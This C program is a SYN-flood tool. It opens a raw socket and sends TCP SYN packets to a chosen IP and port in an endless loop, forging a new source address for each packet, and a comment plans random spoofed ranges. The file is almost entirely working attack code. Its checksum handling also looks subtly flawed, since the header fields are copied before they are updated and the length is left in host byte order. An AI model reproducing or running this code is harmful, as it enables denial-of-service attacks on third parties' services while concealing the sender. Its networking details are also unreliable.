#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

/*
 * The pseudo header that is used in checksum calculations.
 * From http://www.enderunix.org/docs/en/rawipspoof/.
 */
struct tcp_pseudo_header {
    struct in_addr src;
    struct in_addr dst;
    uint8_t pad;
    uint8_t proto;
    uint16_t tcp_len;
    struct tcphdr tcp;
};

/*
 * Calculate the Internet checksum, as described in RFC1071.
 * The implementation is from: http://www.enderunix.org/docs/en/rawipspoof/
 * TODO: Understand the algorithm and rewrite it.
 */
uint16_t inet_checksum(uint16_t *addr, int len)
{
    int nleft = len;
    int sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

int main(int argc, char **argv)
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s dest_ip dest_port\n", argv[0]);
        return 1;
    }

    srand(time(NULL));

    int fd;
    /*
     * Note the following from raw(7):
     *
     * A protocol of IPPROTO_RAW implies enabled IP_HDRINCL and is able to
     * send  any  IP  protocol  that  is  specified  in the passed header.
     *
     * ┌───────────────────────────────────────────────────┐
     * │IP Header fields modified on sending by IP_HDRINCL │
     * ├──────────────────────┬────────────────────────────┤
     * │IP Checksum           │ Always filled in           │
     * ├──────────────────────┼────────────────────────────┤
     * │Source Address        │ Filled in when zero        │
     * ├──────────────────────┼────────────────────────────┤
     * │Packet ID             │ Filled in when zero        │
     * ├──────────────────────┼────────────────────────────┤
     * │Total Length          │ Always filled in           │
     * └──────────────────────┴────────────────────────────┘
     */
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        perror("socket()");
        return 1;
    }

    /* Prepare the IP header.
     * XXX: What should be the header length value?
     */
    struct iphdr ip_header = {
        /*
         * The Internet Header Length (IHL) field has 4 bits, which is the
         * number of 32-bit words. Since an IPv4 header may contain a
         * variable number of options, this field specifies the size of the
         * header (this also coincides with the offset to the data). The
         * minimum value for this field is 5,[22] which indicates a length
         * of 5 × 32 bits = 160 bits = 20 bytes.
         * https://en.wikipedia.org/wiki/IPv4#IHL
         */
        .ihl = 5,
        .version = 4,
        .tos = 0,
        .tot_len = 0, // Filled in by the kernel when left 0
        .id = 0, // Ditto
        .frag_off = 0,
        .ttl = 64,
        .protocol = IPPROTO_TCP,
        .check = 0, // Again, filled in by the kernel
        .saddr = 0, // Filled later
        .daddr = inet_addr(argv[1]) // Checked for errors below
    };

    /*
     * Error check for inet_addr().
     * Note the following notice from inet(3):
     *
     ** The inet_addr() function converts the Internet host address cp  from
     ** IPv4  numbers-and-dots  notation  into  binary  data in network byte
     ** order.  If  the  input  is  invalid,  INADDR_NONE  (usually  -1)  is
     ** returned.  Use of this function is problematic because -1 is a valid
     ** address (255.255.255.255).  Avoid its use in favor  of  inet_aton(),
     ** inet_pton(3),  or  getaddrinfo(3),  which  provide  a cleaner way to
     ** indicate error return.
     *
     * Yet we don't care because we won't be using 255.255.255.255
     * as a dest IP anyways.
     */
    if (ip_header.daddr == INADDR_NONE) {
        fprintf(stderr, "Destination IP invalid: %s\n", argv[1]);
        return 1;
    }

    unsigned long dport;
    dport = strtoul(argv[2], NULL, 10);
    if (dport > 65535 || dport == 0) {
        fprintf(stderr, "Destination port invalid: %s\n", argv[2]);
        return 1;
    }
    /*
     * Prepare the TCP header.
     * XXX: What can be the window size?
     */
    struct tcphdr tcp_header = {
        .source = 0, // Filled later
        .dest = htons(dport),
        .seq = random(),
        .ack_seq = 0,
        .res1 = 0,
        .doff = 5,
        .fin = 0,
        .syn = 1,
        .rst = 0,
        .psh = 0,
        .ack = 0,
        .urg = 0,
        .res2 = 0,
        .window = htons(65535),
        .check = 0, // Filled later
        .urg_ptr = 0
    };

    /*
     * TODO: Use random source IP addresses chosen from a range.
     */
    for (ip_header.saddr = inet_addr("10.0.0.2"); /* forever */ ;
            ip_header.saddr = htonl((ntohl(ip_header.saddr) + 1))) {

        /*
         * See https://en.wikipedia.org/wiki/Transmission_Control_Protocol#TCP_checksum_for_IPv4
         * for reference about the pseudo header.
         */
        struct tcp_pseudo_header phdr = {
            .src.s_addr = ip_header.saddr,
            .dst.s_addr = ip_header.daddr,
            .pad = 0,
            .proto = ip_header.protocol,
            .tcp_len = sizeof(tcp_header), // No payload in SYN. Size is only of the header.
            .tcp = tcp_header
        };
        tcp_header.source = htons((random() % (61000 - 32768 + 1)) + 32768);
        tcp_header.check = inet_checksum((uint16_t *)&phdr, sizeof phdr);

        char packet_buf[sizeof tcp_header + sizeof ip_header];
        memcpy(packet_buf, &ip_header, sizeof ip_header);
        memcpy(packet_buf + sizeof ip_header, &tcp_header, sizeof tcp_header);

        struct sockaddr_in sin = {
            .sin_family = AF_INET,
            .sin_addr.s_addr = ip_header.daddr
        };
        if (sendto(fd, packet_buf, sizeof packet_buf, 0, (struct sockaddr *)&sin, sizeof sin) == -1) {
            perror("sendto()");
            return 1;
        }
        usleep(1);
    }

    return 0;
}
